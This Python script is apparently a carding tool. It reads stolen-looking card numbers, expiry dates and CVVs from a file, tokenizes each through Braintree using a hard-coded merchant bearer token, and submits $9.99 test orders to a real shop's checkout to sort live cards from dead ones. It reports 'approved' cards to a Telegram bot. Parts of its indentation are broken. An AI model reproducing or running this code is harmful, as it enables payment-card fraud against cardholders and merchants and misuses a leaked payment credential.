import os
try:
	import requests
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install requests')
	
try:
	from cfonts import render  
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install python-cfonts')
	
try:
	from fake_useragent import UserAgent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install user_agent')
	
import requests,time,webbrowser
from cfonts import render, say
import random,string,user_agent,base64
from fake_useragent import UserAgent
#from bin_info_v1 import bin_info

try:
	import requests
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install requests')
try:
	from user_agent import generate_user_agent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install user_agent')
	
try:
	from cfonts import render  
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install python-cfonts')
	
try:
	 import user_agent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install user_agent')

webbrowser.open('https://t.me/ModcaTheLost')
user = user_agent.generate_user_agent()
		
md1 = '\x1b[1;31m'  # أحمر
md2 = '\x1b[1;32m'  # أخضر

import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
os.system('clear')            
from cfonts import render  
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          
output = render('MODCA', colors=['white', 'magenta'], align='center')
print(output)

print("      ~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
print("\x1b[38;5;5m—" * 72)
print('\n')
token = input('Enter Your Token : ')
id = input('Enter Your.ID : ')
print('\n')

file=open('Modca.txt',"+r")


O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple

start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    #time.sleep(10)
    start_time = time.time()
    
    headers = {
	        'authority': 'payments.braintree-api.com',
	        'accept': '*/*',
	        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
	        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUzNzQ0NjcsImp0aSI6IjUyYmJhMDgwLTM4YmItNGUyOC04ZGRiLTE3Y2Q2MGQwOGE3MCIsInN1YiI6Imc3Y2JjdHluc2c0ZmJqY3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imc3Y2JjdHluc2c0ZmJqY3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.16Ia9REDFPYO2y9xBRNxYHsV1GhTbimUv1eduKGfI_8GmavbgRAiJNM4EefPKiH-8KAHcaWDfe7tSEuXwQnxyQ',
	        'braintree-version': '2018-05-10',
	        'content-type': 'application/json',
	        'origin': 'https://assets.braintreegateway.com',
	        'referer': 'https://assets.braintreegateway.com/',
	        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	        'sec-ch-ua-mobile': '?1',
	        'sec-ch-ua-platform': '"Android"',
	        'sec-fetch-dest': 'empty',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-site': 'cross-site',
	        'user-agent': user,
	    }
	    
    json_data = {
	        'clientSdkMetadata': {
	            'source': 'client',
	            'integration': 'custom',
	            'sessionId': 'db00dc02-d0a4-43d9-9a21-cee5a2798c75',
	        },
	        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	        'variables': {
	            'input': {
	                'creditCard': {
	                    'number': n,
	                    'expirationMonth': mm,
	                    'expirationYear': yy,
	                    'cvv': cvc,
	                    'billingAddress': {
	                        'postalCode': '10080',
	                    },
	                },
	                'options': {
	                    'validate': False,
	                },
	            },
	        },
	        'operationName': 'TokenizeCreditCard',
	    }
	    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	    
    response_data = response.json()
if response_data and 'data' in response_data and 'tokenizeCreditCard' in response_data['data']:
    t = response_data['data']['tokenizeCreditCard']['token']
else:
    print("Required keys are missing in the response data")
    t = None
	    
    if t:
	    print(f'{md2}• Tσкяи Wαѕ EχтяαcтєD Sυccєѕѕfυℓℓу √ ')
    else:
	    print(f'{md1}• Eяяσя •')
	    
    headers = {
	        'authority': 'api.zephyr-sim.com',
	        'accept': 'application/json, text/plain, */*',
	        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
	        'content-type': 'application/json',
	        'origin': 'https://zephyr-sim.com',
	        'referer': 'https://zephyr-sim.com/',
	        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	        'sec-ch-ua-mobile': '?1',
	        'sec-ch-ua-platform': '"Android"',
	        'sec-fetch-dest': 'empty',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-site': 'same-site',
	        'user-agent': user,
	    }
	    
    json_data = {
	        'paymentMethodNonce': t,
	        'email': 'fcodzilla@gmail.com',
	        'cart': [
	            {
	                'productId': 'HOBBYIST-PACK',
	                'quantity': 1,
	                'isUpsell': False,
	                'isDownsell': False,
	            },
	        ],
	        'billingCountry': 'US',
	        'billingStateProvince': 'NY',
	        'billingPostalCode': '10080',
	        'expedited': False,
	        'total': 9.99,
	    }
	    
    response = requests.post('https://api.zephyr-sim.com/v2/orders/braintree', headers=headers, json=json_data)
	    #print(P,'>>>',response.json())
	    
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)
	    
	    #print(P,'->>',response.json()['message'])
    if 'Invalid Transaction' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Invalid Transaction ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	    	
    elif 'Call Issuer. Pick Up Card.' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Call Issuer. Pick Up Card. ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	    	
    elif 'Processor Declined - Fraud Suspected' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Processor Declined - Fraud Suspected ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	
    elif 'Processor Declined' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Processor Declined ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	    	
    elif 'No Account' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> 𝗡σ 𝗔𝗰𝗰συит ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	    	
    elif 'Declined - Call Issuer' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Declined - Call Issuer ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	
    elif 'Closed Card' in response.text:
	    print(f'''{md1}𝗗є𝗰ℓιиє𝗗 ❌
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Closed Card ❌
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	
    elif 'Insufficient Funds' in response.text:
	    print(f'''{md2}𝗔ρρяσνє𝗗 ✅
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> Approved ✅
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
    
    elif 'Card Issuer Declined CVV' in response.text:
	    print(f'''{md2}𝗔ρρяσνє𝗗 ✅
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> 𝗖𝗖𝗡 ✅
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~
	''')
	    	
	  
	    requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
	𝗔ρρяσνє𝗗 ✅
	            
	𝗖αя𝗗 -> {P}
	𝗚αтєωαу -> 𝗨икиσωи 💋    
	𝗥єѕρσиѕє -> 𝗖𝗖𝗡 ✅
	
	𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
	
	𝗣яσɢяαммεя -> @B_6_Q ~""")
	
    else:
	    print(response.json()['message'])
    time.sleep(20)
